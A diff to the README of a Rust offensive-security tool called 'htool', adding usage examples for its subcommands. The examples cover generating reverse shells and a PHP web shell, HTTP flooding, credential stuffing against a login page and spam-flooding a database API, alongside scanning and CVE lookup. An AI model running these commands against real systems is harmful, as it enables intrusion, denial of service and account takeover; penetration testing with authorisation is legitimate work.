@@ -39,20 +39,68 @@ cargo build --release
 
 ### Command Line Interface (CLI)
 
+Get general help:
 ```bash
-# Run a vulnerability scan (Includes advanced checks: Tech stack, AXFR, Takeovers)
-./target/release/htool scan example.com --mode full --output report.html
-
-# Search the offline CVE database
-./target/release/htool cve-search Apache
-
-# Generate a shell payload
-./target/release/htool payload --payload-type reverse --platform linux --lhost 10.10.10.10 --lport 4444
+./target/release/htool --help
 ```
+
+#### 1. Vulnerability Scanner (`scan`)
+Scan a target URL or host (includes port scanning, SQLi, XSS, directory brute forcing, subdomain discovery, SSL analysis, security header audits, and CVE matching).
+```bash
+# Quick scan with default options
+./target/release/htool scan example.com
+
+# Full scan with a custom proxy and rate limits, saving HTML report
+./target/release/htool scan example.com --mode full --rate 15 --proxy http://127.0.0.1:8080 --output report.html
+```
+
+#### 2. Offline CVE Lookup (`cve-search`)
+Query the local database of Common Vulnerabilities and Exposures by keywords.
+```bash
+./target/release/htool cve-search Apache
+```
+
+#### 3. Payload Generation (`payload`)
+Generate reverse shells, bind shells, web shells, and download/execution payloads across multiple languages.
+```bash
+# Generate a reverse shell payload
+./target/release/htool payload --payload-type reverse --platform linux --lhost 10.10.10.10 --lport 4444
+
+# Generate a PHP web shell and save to a file
+./target/release/htool payload --payload-type webshell --platform php --password secretpass --output shell.php
+```
+
+#### 4. Stress Testing (`stress`)
+Simulate network load on targets.
+```bash
+# HTTP flood with 50 threads for 60 seconds
+./target/release/htool stress http://192.168.1.1 --attack http --threads 50 --duration 60
+```
+
+#### 5. Credential Stuffing (`cred-stuff`)
+Perform mass login tests against an authentication endpoint.
+```bash
+./target/release/htool cred-stuff http://example.com/login --users users.txt --passes passwords.txt --threads 10 --success-text "dashboard"
+```
+
+#### 6. Spam & Flooding (`spam`)
+Test rate limiting on databases, forums, forms, and services.
+```bash
+# Flood a database API endpoint with random data
+./target/release/htool spam db-flood http://example.com/api/insert --count 500 --threads 20
+```
+
+#### 7. Report Generation (`report`)
+Create HTML reports from raw scan JSON files.
+```bash
+./target/release/htool report scan_results.json --output report.html
+```
+
+---
 
 ### Graphical User Interface (GUI)
 
-Launch the reactive user interface featuring live async progress updates, logs, and export managers:
+Launch the interactive dashboard with real-time logs, live async progress bars, and file export options:
 ```bash
 ./target/release/htool-gui
 ```
